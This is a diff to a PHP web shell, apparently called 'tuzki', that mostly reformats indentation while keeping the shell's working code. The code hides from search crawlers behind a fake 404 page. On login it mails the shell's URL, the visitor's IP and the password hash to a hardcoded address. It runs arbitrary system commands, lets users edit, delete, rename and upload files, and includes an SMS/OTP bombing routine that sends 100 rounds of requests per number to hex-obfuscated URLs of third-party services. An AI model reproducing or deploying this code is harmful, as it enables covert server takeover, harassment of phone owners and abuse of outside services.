@@ -20,7 +20,23 @@
  * MA 02110-1301, USA.
  *
  *
-*/
+ * Function list:
+ * - login_shell()
+ * - post_data()
+ * - home()
+ * - spamsms()
+ * - music()
+ * - jumping()
+ * - config()
+ * - mass_deface()
+ * - info()
+ * - logout()
+ * - alert()
+ * - edit()
+ * - open()
+ * - cmd()
+ * - renames()
+ */
 session_start();
 //set_time_limit(0);
 //ini_set('error_log',0);
@@ -29,37 +45,37 @@ session_start();
 //ini_set('max_execution_time',0);
 $auth_pass = "5a3844a15924bd86558bb85026e633f89d23c191"; //  sha1('tuzki')
 if (!empty($_SERVER['HTTP_USER_AGENT'])) {
-	$userAgents = array(
-		"Googlebot",
-		"DuckDuckBot",
-		"Baiduspider",
-		"Exabot",
-		"SimplePie",
-		"Curl",
-		"OkHttp",
-		"SiteLockSpider",
-		"BLEXBot",
-		"ScoutJet",
-		"AdsBot Google Mobile",
-		"Googlebot Mobile",
-		"MJ12bot",
-		"Slurp",
-		"MSNBot",
-		"PycURL",
-		"facebookexternalhit",
-		"facebot",
-		"ia_archiver",
-		"crawler",
-		"YandexBot",
-		"Rambler",
-		"Yahoo! Slurp",
-		"YahooSeeker",
-		"bingbot"
-	);
-	if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-		header('HTTP/1.0 404 Not Found');
-		exit;
-	}
+    $userAgents = array(
+        "Googlebot",
+        "DuckDuckBot",
+        "Baiduspider",
+        "Exabot",
+        "SimplePie",
+        "Curl",
+        "OkHttp",
+        "SiteLockSpider",
+        "BLEXBot",
+        "ScoutJet",
+        "AdsBot Google Mobile",
+        "Googlebot Mobile",
+        "MJ12bot",
+        "Slurp",
+        "MSNBot",
+        "PycURL",
+        "facebookexternalhit",
+        "facebot",
+        "ia_archiver",
+        "crawler",
+        "YandexBot",
+        "Rambler",
+        "Yahoo! Slurp",
+        "YahooSeeker",
+        "bingbot"
+    );
+    if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
 }
 function login_shell() {
 ?>
@@ -71,20 +87,21 @@ function login_shell() {
 <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
 </head>
 <?php
-	exit;
+    exit;
 }
-if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST']))])) {
-	if (empty($auth_pass) or (isset($_GET['pass']) and sha1($_GET['pass']) == $auth_pass)) {
-		$_SESSION[md5(sha1($_SERVER['HTTP_HOST']))] = true;
-		$email        = "gedzsarjuncomuniti@gmail.com"; // Your Email
-		$shell_path   = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-		$subject      = "Logs";
-		$from         = "From:Cvar1984";
-		$content_mail = "URL : $shell_path\n\nIP : " . $_SERVER['REMOTE_ADDR'] . "\n\nPassword : $auth_pass\n\nBy Cvar1984";
-		@mail($email, $subject, $content_mail, $from);
-	} else {
-		login_shell();
-	}
+if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ])) {
+    if (empty($auth_pass) or (isset($_GET['pass']) and sha1($_GET['pass']) == $auth_pass)) {
+        $_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ] = true;
+        $email = "gedzsarjuncomuniti@gmail.com"; // Your Email
+        $shell_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+        $subject = "Logs";
+        $from = "From:Cvar1984";
+        $content_mail = "URL : $shell_path\n\nIP : " . $_SERVER['REMOTE_ADDR'] . "\n\nPassword : $auth_pass\n\nBy Cvar1984";
+        @mail($email, $subject, $content_mail, $from);
+    }
+    else {
+        login_shell();
+    }
 }
 ?>
 <!DOCTYPE html>
@@ -155,16 +172,16 @@ body {
 <?php
 // FUNCTION
 function post_data($url, $data) {
-	$ch = curl_init($url);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-	return curl_exec($ch);
-	curl_close($ch);
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    return curl_exec($ch);
+    curl_close($ch);
 }
 function home() {
-	echo "<script>window.location='?';</script>";
+    echo "<script>window.location='?';</script>";
 }
 function spamsms() {
 ?>
@@ -177,40 +194,41 @@ function spamsms() {
 </form>
 </center>
 <?php
-if (isset($_POST['action'])) {
-	$no = explode("\n", $_POST['no']);
-	$no = str_replace(' ', '', $no);
-	$no = str_replace("\n\n", "\n", $no);
-	foreach ($no as $on):
-		echo "<hr>Calling     -> " . $on . "<hr><br>";
-	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70", "msisdn=" . $on . "&accept=call");
-	endforeach;
-	for ($x = 0;$x < 100;$x++) {
-		foreach ($no as $on):
-		echo "<hr>Send OTP To -> " . $on . "<hr><br>";
-		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73", "phone=" . $on . "&smsType=1");
-		post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50", "phone_number=" . $on);
-	endforeach;
-	}
-} else {
-	die();
-}
-die();
+    if (isset($_POST['action'])) {
+        $no = explode("\n", $_POST['no']);
+        $no = str_replace(' ', '', $no);
+        $no = str_replace("\n\n", "\n", $no);
+        foreach ($no as $on):
+            echo "<hr>Calling     -> " . $on . "<hr><br>";
+            post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70", "msisdn=" . $on . "&accept=call");
+        endforeach;
+        for ($x = 0;$x < 100;$x++) {
+            foreach ($no as $on):
+                echo "<hr>Send OTP To -> " . $on . "<hr><br>";
+                post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73", "phone=" . $on . "&smsType=1");
+                post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50", "phone_number=" . $on);
+            endforeach;
+        }
+    }
+    else {
+        die();
+    }
+    die();
 }
 function music() {
-	echo "<center>";
-	echo "<iframe width='700px' height='500px' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874911&amp;color=#00cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
-	echo "</center>";
-	die();
+    echo "<center>";
+    echo "<iframe width='700px' height='500px' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874911&amp;color=#00cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
+    echo "</center>";
+    die();
 }
 function jumping() {
-	alert("Kalem euy");
+    alert("Kalem euy");
 }
 function config() {
-	alert("Kalem euy");
+    alert("Kalem euy");
 }
 function mass_deface() {
-	alert("Kalem euy");
+    alert("Kalem euy");
 }
 function info() {
 ?>
@@ -218,20 +236,166 @@ function info() {
 	<textarea class="form-control" id="textarea" readonly/><?php print_r($_SERVER); ?></textarea>
 	</center>
 	<?php
-	die();
+    die();
 }
 function logout() {
-	unset($_SESSION[md5(sha1($_SERVER['HTTP_HOST']))]);
-	home();
+    unset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ]);
+    home();
 }
 function alert($message) {
-	echo "<script>alert('" . $message . "')</script>";
+?>
+<script>
+var ALERT_TITLE = "Alert";
+var ALERT_BUTTON_TEXT = "Ok";
+if(document.getElementById) {
+	window.alert = function(txt) {
+		createCustomAlert(txt);
+	}
+}
+function createCustomAlert(txt) {
+	d = document;
+	if(d.getElementById("modalContainer")) return;
+	mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
+	mObj.id = "modalContainer";
+	mObj.style.height = d.documentElement.scrollHeight + "px";
+	alertObj = mObj.appendChild(d.createElement("div"));
+	alertObj.id = "alertBox";
+	if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
+	alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
+	alertObj.style.visiblity="visible";
+	h1 = alertObj.appendChild(d.createElement("h1"));
+	h1.appendChild(d.createTextNode(ALERT_TITLE));
+	msg = alertObj.appendChild(d.createElement("p"));
+	//msg.appendChild(d.createTextNode(txt));
+	msg.innerHTML = txt;
+	btn = alertObj.appendChild(d.createElement("a"));
+	btn.id = "closeBtn";
+	btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
+	btn.href = "#";
+	btn.focus();
+	btn.onclick = function() { removeCustomAlert();return false; }
+	alertObj.style.display = "block";
+}
+function removeCustomAlert() {
+	document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
+}
+</script>
+
+<style>
+#modalContainer {
+	background-color:rgba(0, 0, 0, 0.3);
+	position:absolute;
+	width:100%;
+	height:100%;
+	top:0px;
+	left:0px;
+	z-index:10000;
+	background-image:url(tp.png); /* required by MSIE to prevent actions on lower z-index elements */
+}
+
+#alertBox {
+	position:relative;
+	width:300px;
+	min-height:100px;
+	margin-top:50px;
+	border:1px solid #666;
+	background-color:#fff;
+	background-repeat:no-repeat;
+	background-position:20px 30px;
+}
+
+#modalContainer > #alertBox {
+	position:fixed;
+}
+
+#alertBox h1 {
+	margin:0;
+	font:bold 0.9em verdana,arial;
+	background-color:#3073BB;
+	color:#FFF;
+	border-bottom:1px solid #000;
+	padding:2px 0 2px 5px;
+}
+
+#alertBox p {
+	color:red;
+	height:50px;
+	padding-left:5px;
+	margin-left:55px;
+}
+
+#alertBox #closeBtn {
+	display:block;
+	position:relative;
+	margin:5px auto;
+	padding:7px;
+	border:0 none;
+	width:70px;
+	font:0.7em verdana,arial;
+	text-transform:uppercase;
+	text-align:center;
+	color:#FFF;
+	background-color:#357EBD;
+	border-radius: 3px;
+	text-decoration:none;
+}
+
+/* unrelated styles */
+
+#mContainer {
+	position:relative;
+	width:600px;
+	margin:auto;
+	padding:5px;
+	border-top:2px solid #000;
+	border-bottom:2px solid #000;
+	font:0.7em verdana,arial;
+}
+
+h1,h2 {
+	margin:0;
+	padding:4px;
+	font:bold 1.5em verdana;
+	border-bottom:1px solid #000;
+}
+
+code {
+	font-size:1.2em;
+	color:#069;
+}
+
+#credits {
+	position:relative;
+	margin:25px auto 0px auto;
+	width:350px; 
+	font:0.7em verdana;
+	border-top:1px solid #000;
+	border-bottom:1px solid #000;
+	height:90px;
+	padding-top:4px;
+}
+
+#credits img {
+	float:left;
+	margin:5px 10px 5px 0px;
+	border:1px solid #000000;
+	width:80px;
+	height:79px;
+}
+
+.important {
+	background-color:#F5FCC8;
+	padding:2px;
+}
+</style>
+<script>alert(<?php echo "'" . $message . "'"; ?>);</script>
+<?php
 }
 function edit($filename) {
-	if (isset($_POST['text'])) {
-		file_put_contents($filename, $_POST['text']);
-	}
-	$text = file_get_contents($filename);
+    if (isset($_POST['text'])) {
+        file_put_contents($filename, $_POST['text']);
+    }
+    $text = file_get_contents($filename);
 ?>
 <form action="" method="post">
 <center>
@@ -241,61 +405,62 @@ function edit($filename) {
 </center>
 </form>
 <?php
-	die();
+    die();
 }
 function open($filename) {
-	alert("this extension is not supported");
-	home();
+    alert("this extension is not supported");
+    home();
 }
 function cmd($cmd) {
-	if (function_exists('system')) {
-		ob_start();
-		@system($cmd);
-		$buff = ob_get_contents();
-		ob_end_clean();
-		return $buff;
-	}
-	elseif (function_exists('exec')) {
-		@exec($cmd, $results);
-		$buff = "";
-		foreach ($results as $result) {
-			$buff .= $result;
-		}
-		return $buff;
-	}
-	elseif (function_exists('passthru')) {
-		ob_start();
-		@passthru($cmd);
-		$buff = ob_get_contents();
-		ob_end_clean();
-		return $buff;
-	}
-	elseif (function_exists('shell_exec')) {
-		$buff = @shell_exec($cmd);
-		return $buff;
-	}
+    if (function_exists('system')) {
+        ob_start();
+        @system($cmd);
+        $buff = ob_get_contents();
+        ob_end_clean();
+        return $buff;
+    }
+    elseif (function_exists('exec')) {
+        @exec($cmd, $results);
+        $buff = "";
+        foreach ($results as $result) {
+            $buff .= $result;
+        }
+        return $buff;
+    }
+    elseif (function_exists('passthru')) {
+        ob_start();
+        @passthru($cmd);
+        $buff = ob_get_contents();
+        ob_end_clean();
+        return $buff;
+    }
+    elseif (function_exists('shell_exec')) {
+        $buff = @shell_exec($cmd);
+        return $buff;
+    }
 }
 function renames($filename) {
-	if(isset($_POST['action'])) {
-		if(@rename($filename,$_POST['newname'])) {
-			alert("Success");
-			home();
-		} else {
-			alert("Permission Denied");
-			home();
-		}
-	}
-	?>
+    if (isset($_POST['action'])) {
+        if (@rename($filename, $_POST['newname'])) {
+            alert("Success");
+        }
+        else {
+            alert("Permission Denied");
+        }
+        home();
+    }
+?>
 	<form method='post'>
 		<center>
-	<td>Filename : <input type='text' class='input-sm' id='input' value='<?php echo $filename;?>' name='newname'></td>
+	<td>Filename : <input type='text' class='input-sm' id='input' value='<?php echo $filename; ?>' name='newname'></td>
 	<input type='submit' class='btn btn-danger' name='action' value='rename'>
 	</center>
 	</form>
 	<?php
-	die();
+    die();
 }
-// ENDFUNCTION
+// END FUNCTION
+
 ?>
  <nav class="navbar navbar-inverse">
   <div class="container-fluid">
@@ -320,48 +485,49 @@ function renames($filename) {
 </nav>
 <?php
 if ($_GET['do'] == 'home') {
-	home();
+    home();
 }
 elseif ($_GET['do'] == 'sms') {
-	spamsms();
+    spamsms();
 }
-elseif($_GET['do'] == 'music') {
-	music();
+elseif ($_GET['do'] == 'music') {
+    music();
 }
 elseif ($_GET['do'] == 'jumping') {
-	jumping();
+    jumping();
 }
 elseif ($_GET['do'] == 'config') {
-	config();
+    config();
 }
 elseif ($_GET['do'] == 'mass_deface') {
-	mass_deface();
+    mass_deface();
 }
 elseif ($_GET['do'] == 'info') {
-	info();
+    info();
 }
 elseif ($_GET['do'] == 'logout') {
-	logout();
+    logout();
 }
 elseif ($_GET['do'] == 'edit' and isset($_GET['files'])) {
-	edit($_GET['files']);
+    edit($_GET['files']);
 }
 elseif ($_GET['do'] == 'open' and isset($_GET['dir'])) {
-	$dir = $_GET['dir'];
-	chdir($dir);
+    $dir = $_GET['dir'];
+    chdir($dir);
 }
 elseif ($_GET['do'] == 'view' and isset($_GET['files'])) {
-	open($_GET['files']);
+    open($_GET['files']);
 }
-elseif($_GET['do'] == 'delete' and isset($_GET['files'])) {
-	if(@unlink($_GET['files'])) {
-		alert("Success");
-		} else {
-		alert("Permission Denied");
-	}
+elseif ($_GET['do'] == 'delete' and isset($_GET['files'])) {
+    if (@unlink($_GET['files'])) {
+        alert("Success");
+    }
+    else {
+        alert("Permission Denied");
+    }
 }
-elseif($_GET['do'] == 'rename' and isset($_GET['files'])) {
-	renames($_GET['files']);
+elseif ($_GET['do'] == 'rename' and isset($_GET['files'])) {
+    renames($_GET['files']);
 }
 $dir = scandir(getcwd());
 foreach ($dir as $dir):
@@ -369,58 +535,59 @@ foreach ($dir as $dir):
 <table width='70%' class='table_home' cellpadding='3' cellspacing='3' align='center'>
 	<tr>
 		<?php
-	if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
-		$sep = substr('\\', 0, 1);
-	}
-	else {
-		$sep = '/';
-	}
-	$ext = pathinfo($dir, PATHINFO_EXTENSION);
-	if (is_dir($dir)) {
-		echo "
+    if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
+        $sep = substr('\\', 0, 1);
+    }
+    else {
+        $sep = '/';
+    }
+    $ext = pathinfo($dir, PATHINFO_EXTENSION);
+    if (is_dir($dir)) {
+        echo "
 		<td><img src='http://icons.iconarchive.com/icons/dakirby309/simply-styled/256/Blank-Folder-icon.png' class='icon'>";
-		echo "<a href='?do=open&dir=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
-		echo "<td style='float:right;'>
+        echo "<a href='?do=open&dir=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+        echo "<td style='float:right;'>
 		<a href='?'>Chmod | </a>
 		<a href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename | </a>
 		<a href='?'>Downlod | </a>
 		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
-	}
-	elseif ($ext == 'jpg' OR $ext == 'png' OR $ext == 'jpeg' OR $ext == 'gif' OR $ext == 'rar' OR $ext == 'zip' OR $ext == 'doc' OR $ext == 'pdf') {
-		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
-		echo "<a href='?do=view&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
-		echo "<td style='float:right;'>
+    }
+    elseif ($ext == 'jpg' OR $ext == 'png' OR $ext == 'jpeg' OR $ext == 'gif' OR $ext == 'rar' OR $ext == 'zip' OR $ext == 'doc' OR $ext == 'pdf') {
+        echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
+        echo "<a href='?do=view&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+        echo "<td style='float:right;'>
 		<a href='?'> Chmod | </a>
 		<a href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename | </a>
 		<a href='?'>Downlod | </a>
 		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
-	}
-	else {
-		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
-		echo "<a href='?do=edit&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
-		echo "<td style='float:right;'>
+    }
+    else {
+        echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
+        echo "<a href='?do=edit&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+        echo "<td style='float:right;'>
 		<a href='?'> Chmod | </a>
 		<a href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename | </a>
 		<a href='?'>Downlod | </a>
 		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
-	}
+    }
 ?>
 	</tr>
 </table>
 <?php
 endforeach;
-if(isset($_POST['upl'])) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
-	alert("Upload Success");
-	} else {
-		alert("Upload Failed");
-	}
+if (isset($_POST['upl'])) {
+    if (copy($_FILES['file']['tmp_name'], getcwd() . $sep . $_FILES['file']['name'])) {
+        alert("Upload Success");
+    }
+    else {
+        alert("Upload Failed");
+    }
 }
 ?>
-<p>
-<center>
-<form method="post" enctype="multipart/form-data">
-<input type="file" name="file" size="50">
-<input class="btn btn-danger" name="upl" type="submit">
-</form>
+	<form method="post" enctype="multipart/form-data">
+		<center>
+			<input class="btn" id="input" type="file" name="file"/>
+			<input class="btn btn-danger" name="upl" type="submit">
+		</center>
+	</form>
 </body>
